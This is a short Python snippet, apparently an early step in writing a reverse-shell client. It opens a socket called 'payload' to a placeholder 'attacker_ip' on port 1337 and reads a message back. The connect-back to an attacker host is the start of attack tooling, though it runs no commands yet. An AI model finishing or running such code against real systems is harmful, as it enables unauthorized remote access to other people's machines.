import socket

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

## write code to receive and decode message
output = payload.recv(2048) # 1024 is approximately 1K bytes, 2048 is 2K bytes of data
## convert output in a form of string
print(output.decode("utf-8"))
